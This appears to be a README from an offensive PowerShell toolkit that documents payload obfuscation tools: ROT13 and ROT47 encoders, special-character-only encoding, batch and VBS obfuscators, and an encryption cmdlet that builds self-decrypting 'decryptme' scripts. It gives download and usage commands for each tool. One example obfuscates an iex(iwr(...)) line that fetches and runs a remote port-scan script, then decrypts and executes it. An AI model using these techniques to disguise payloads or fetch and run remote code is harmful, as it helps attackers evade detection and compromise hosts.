## Enc-rot13.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|[enc-rot13](https://github.com/r00t-3xp10it/redpill/blob/main/lib/String-Obfuscation/enc-rot13.ps1)|Encrypt or decrypt strings using ROT13 cipher.|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/enc-rot13.png)<br />Creates decrypt script if sellected **-output ps1**<br />|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/enc-rot13.ps1" -OutFile "enc-rot13.ps1"
```

**execute:**
```powershell
.\enc-rot13.ps1 -text "whoami"
.\enc-rot13.ps1 -text "jubnzv"
.\enc-rot13.ps1 -text "whoami" -output ps1
.\enc-rot13.ps1 -text "whoami" -output logfile
.\enc-rot13.ps1 -infile "payload.ps1" -output ps1
```

<br />

## Out-EncodedSpecialCharOnlyCommand.ps1

|Function Name|Description|Privileges|Notes|
|---|---|---|---|
|Out-EncodedSpecialCharOnlyCommand|Generates Special-Character-Only encoded payload<br />for a PowerShell command or script.|User Land|[Screenshot1](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/bhoanoon1.png)<br />[Screenshot2](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/2bhoanoon1.png)<br />[Screenshot3](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/output-to-file.png)|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/Out-EncodedSpecialCharOnlyCommand.ps1" -OutFile "Out-EncodedSpecialCharOnlyCommand.ps1"
```

**execute:**
```powershell
Import-Module -Name ".\Out-EncodedSpecialCharOnlyCommand.ps1" -Force
Out-EncodedSpecialCharOnlyCommand -ScriptBlock {Write-Host 'Hello World!' -ForegroundColor Green; Write-Host 'Obfuscation Rocks!' -ForegroundColor Green} -NoProfile -NonInteractive -PassThru
```

<br />

## Obfuscator.bat

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|obfuscator|Encrypt batch scripts|User Land|Dependencies: [certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) - [Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/obfuscator.png)|

**download script:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/obfuscator.bat" -OutFile "obfuscator.bat"
```

**execute:**
```powershell
.\obfuscator.bat Payload.bat
```

<br />

## vbs_obfuscator.vbs

|Script Name|Description|Privileges|Notes|
|---|---|---|---|
|vbs_obfuscator|Encrypt vbs scripts|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/vbs_obfuscator.png)|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/vbs_obfuscator.vbs" -OutFile "vbs_obfuscator.vbs"
```

```vbs
#Manual
cscript.exe vbs_obfuscator.vbs Payload.vbs

#Automatic
cscript.exe vbs_obfuscator.vbs Payload.vbs > Buffer.vbs
$parse = Get-Content Buffer.vbs
echo $parse[3] > Buffer.vbs

- OR -
cscript.exe vbs_obfuscator.vbs Payload.vbs > Buffer.vbs
$parse = Get-Content Buffer.vbs|Select-String -Pattern "Execute chr"
echo $parse > Buffer.vbs
```

<br />

## Encrypt-String.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|Encrypt-String|Encrypt commands \| scripts using a secret key of 113 bytes|User Land|[Screenshot1](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/Encrypt-String.png) - [Encrypt-String.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/lib/String-Obfuscation/Encrypt-String.ps1)<br />[Screenshot2](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/Encrypt-Decrypt.png) - [Decrypt-String.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/bypass/encrypt_decrypt/Decrypt-String.ps1)|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/Encrypt-String.ps1" -OutFile "Encrypt-String.ps1"
```

**execute:**
```powershell
#Encrypt cmdline OnScreen
.\Encrypt-String.ps1 -action "console" -plaintextstring "whoami"

#Encrypt PS1 script and build decrypt script
.\Encrypt-String.ps1 -action "autodecrypt" -infile "Payload.ps1"

#Encrypt 'whoami' command + send encrypted string to the recipient email address (encrypted chat)
.\Encrypt-String.ps1 -action "console" -plaintextstring "whoami" -SendTo "pedroubuntu@gmail.com"
```

<br />

**Decrypt Strings**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bypass/encrypt_decrypt/Decrypt-String.ps1" -OutFile "Decrypt-String.ps1"

#Decrypt cmdline OnScreen (encrypted chat)
.\Decrypt-String.ps1 -action "console" -EncryptedString "76492d1116743f0423413b16050a5345MgB8AHAARgBNAHgASABTAEIARQA5AEkAWgA5AFIAaQBkAGEAcQBKADkAdwBHAFEAPQA9AHwANQBhAGEANwBhADkAYQBhAGMANgAzADIAOQBmAGQAMwBmADEAMwAwADQAYwBmADgAZAA2AGIAYQBlADUAMABmAA=="
```

<br />

**Article:** https://github.com/r00t-3xp10it/redpill/tree/main/bypass/encrypt_decrypt

<br /><br />

## Convert-ROT47.ps1

|Cmdlet Name|Description|Privileges|Notes|
|---|---|---|---|
|[Convert-ROT47](https://github.com/r00t-3xp10it/redpill/blob/main/lib/String-Obfuscation/Convert-ROT47.ps1)|Rotate ascii chars by nº places (Caesar cipher)|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/Convert-ROT47.png)<br />[Decryption Rountine CmdLet Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/Convert-ROT47_SimpleDecryption.png)<br />[Decryption_Routine_CmdLet_Screenshot2](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/Convert-ROT47_IEXIWR.png)<br />Creates decrypt script if sellected **-action 'decryptme'**|

**download cmdLet:**
```powershell
iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/String-Obfuscation/Convert-ROT47.ps1" -OutFile "Convert-ROT47.ps1"
```

**execute:**
```powershell
#Encrypt Text using from rot 5 to rot 10 char rotation
.\Convert-ROT47.ps1 -Text 'This is an encrypted string!' -Rot (5..10) -Encrypt
#Outputs:
#    Rot Text
#    --- ----
#      5 Vjku ku cp gpet{rvgf uvtkpi#
#      6 Uijt jt bo fodszqufe tusjoh"
#      7 This is an encrypted string!
#      8 Sghr hr `m dmbqxosdc rsqhmf~
#      9 Rfgq gq _l clapwnrcb qrpgle}
#     10 Qefp fp ^k bk`ovmqba pqofkd|


#Encrypt Text using rot 4
.\Convert-ROT47.ps1 -Text 'This is an encrypted string!' -rot 4 -Encrypt
#Outputs:
#    Rot Text
#    --- ----
#      4 Xlmw mw er irgv}txih wxvmrk%


#Decrypt rot 4 strings
.\Convert-ROT47.ps1 -Text 'Xlmw mw er irgv}txih wxvmrk%' -rot 4 -Decrypt
#Outputs:
#    Rot Text
#    --- ----
#      4 This is an encrypted string!


#Convert text to rot7 and build the decrypt script (decryptme.ps1)
.\Convert-ROT47.ps1 -Text 'whoami /priv;echo ""' -Rot "7" -Action "decryptme" -Encrypt
.\Decryptme.ps1


#Download demonstration cmdlet ( cmdlet contents are going to be converted to ROT8  later )
iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/CertSign_PS1/auxiliary.ps1" -OutFile "Payload.ps1"
#Convert Payload.ps1 contents to rot8 and build the decrypt\execute routine script. (decryptme.ps1)
.\Convert-ROT47.ps1 -Infile "$pwd\Payload.ps1" -Rot "8" -Action "decryptme" -Encrypt
.\Decryptme.ps1


#Obfuscate the IEX(IWR('')) -Text 'string' and create the decryptme.ps1 that decrypt\execute the -text 'string' if executed ..
.\Convert-ROT47.ps1 -Text "iex(iwr('https://raw.githubusercontent.com/samratashok/nishang/master/Scan/Invoke-PortScan.ps1'));Invoke-PortScan -StartAddress '192.168.1.250' -EndAddress '192.168.1.254' -ResolveHost -ScanPort" -Rot "22" -Action "decryptme" -Encrypt
.\Decryptme.ps1

[Manual] #Decrypt the IEX(IWR('')) Obfuscated string by last convertion
# NOTE: double quotes are necessary in -Text "string" to deobfuscted correctly, because obfuscated string contains single quotes chars
.\Convert-ROT47.ps1 -Text "!{0>!/*>=~,,(+PEE*w/D}!,~-x-+{*y'&,{&,Dy'%E+w%*w,w+~'#E&!+~w&}E%w+,{*Eiyw&E_&.'#{Cf'*,iyw&D(+G=??Q_&.'#{Cf'*,iyw& Ci,w*,Wzz*{++ =GOHDGLNDGDHKF= C[&zWzz*{++ =GOHDGLNDGDHKJ= Ch{+'`$.{^'+, Ciyw&f'*," -rot '22' -Decrypt
```

<br />

**Final Notes:**
```powershell
[Remark]: When invoking -action 'decryptme' parameter. We need to test if 'decryptme.ps1'
executes successfuly. If NOT then try to create it invoking a diferent ROT rotation.

[Remark]: Try to use single quotes ['] in -text 'string' parameter if possible OR
else its required to escape special chars like: ` $ " on -Text 'string' -Decrypt function.
```
